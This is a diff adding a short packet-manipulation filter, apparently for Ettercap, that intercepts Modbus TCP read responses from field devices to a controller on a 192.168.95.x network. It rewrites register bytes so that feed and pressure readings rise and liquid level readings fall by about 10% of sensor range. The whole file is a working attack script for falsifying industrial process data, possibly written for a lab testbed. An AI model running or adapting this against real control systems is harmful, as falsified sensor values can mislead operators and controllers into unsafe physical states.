@@ -1,0 +1,30 @@
+# increase feed 1 reading by 10% of sensor range
+# increase pressure reading by 10% of sensor range
+# decrease liquid level reading by 10% of sensor range
+
+# feed 1
+if (ip.src == '192.168.95.10' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        if (DATA.data + 11 <= 0xdf) {
+            DATA.data + 11 += 0x20;
+        }
+    }
+}
+
+# pressure
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        if (DATA.data + 9 <= 0xdf) {
+            DATA.data + 9 += 0x20;
+        }
+    }
+}
+
+# liquid level
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        if (DATA.data + 11 >= 0x20) {
+            DATA.data + 11 -= 0x20;
+        }
+    }
+}
